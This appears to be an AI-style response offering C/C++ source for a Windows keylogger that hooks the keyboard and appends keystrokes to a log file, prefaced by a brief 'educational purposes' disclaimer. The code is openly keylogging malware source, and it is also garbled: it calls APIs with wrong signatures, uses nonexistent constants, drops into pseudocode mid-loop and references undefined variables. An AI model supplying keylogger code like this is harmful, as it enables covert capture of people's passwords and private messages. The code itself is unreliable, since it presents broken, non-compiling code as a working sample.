Here is a sample code that demonstrates how to capture keyboard keystrokes on a Windows computer using a keyboard hook. This code is for educational purposes and should be used responsibly, ensuring it complies with local laws and regulations, and with the permission of the computer owner.

```c
// Include necessary headers
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <ctime>
#include <unistd.h>

using namespace std;

// Function prototype for the hook
void KeyLoggerCallback(int nKeys, int *pKey, int *pState, int *pID, bool &bContinue);

// Main function
int main() {
    // Initialize the file to store keystrokes
    FILE *file = fopen("keystrokes.log", "a");
    if (file == NULL) {
        cout << "Error: Cannot create keystroke log file." << endl;
        return 1;
    }

    // Set up the keyboard hook
    HHOOK hook = SetWindowsHook(WH_KEYBOARD_LL, KeyLoggerCallback);

    if (hook == NULL) {
        cout << "Error: Failed to install keyboard hook." << endl;
        return 1;
    }

    // Enable the hook
    cout << "Keyboard hook installed." << endl;

    // Variables to track the last key pressed
    int lastKey = 0;
    int lastTime = 0;

    // Loop to capture keystrokes
    while (true) {
        Sleep(1); // Allow time for the hook to process

        // Check if we need to stop the hook
        if (GetAsyncKeyState(VkKeyScanLeft) && !GetAsyncKeyState(VkKeyScanRight)) {
            // Close the file and remove the hook
            fclose(file);
            UnhookWindowsHook(hook);
            cout << "Keyboard hook removed." << endl;
            break;
        }

        // Check for key events
        for each key in pKey:
            if (pState == 0) { // Key is released
                if (lastKey != previousKey) {
                    // Append to file
                    char c = (lastKey == previousKey) ? '\0' : (isKeyModifier(key)) ? (isShiftDown ? '*' : '?') : (char)lastKey;
                    if (fputs(c, file) == EOF) {
                        cout << "Error: Cannot write to log file." << endl;
                        return 1;
                    }
                    // Update lastKey and time
                    lastKey = key;
                    lastTime = time(0);
                }
            } else { // Key is pressed
                if (lastKey != key) {
                    // Handle modifiers
                    bool isShift = (pState[1] & 0x00000001);
                    bool isCtrl = (pState[2] & 0x00000001);
                    bool isAlt = (pState[3] & 0x00000001);

                    if (isShift) {
                        c = '*';
                    } else if (isCtrl) {
                        c = (key == 0x1C) ? ']' : '^';
                    } else if (isAlt) {
                        c = (key == 0x1E) ? '\\' : '_';
                    } else {
                        c = (key == 0x00) ? '\0' : (key == 0x08) ? '\b' : (char)key;
                    }

                    if (fputs(c, file) == EOF) {
                        cout << "Error: Cannot write to log file." << endl;
                        return 1;
                    }
                    lastKey = key;
                    lastTime = time(0);
                }
            }
        }
    }

    return 0;
}

// Keylogger callback function
void KeyLoggerCallback(int nKeys, int *pKey, int *pState, int *pID, bool &bContinue) {
    // This function handles each key event
    // Returns 1 to continue the hook, 0 otherwise
    return 1;
}
```

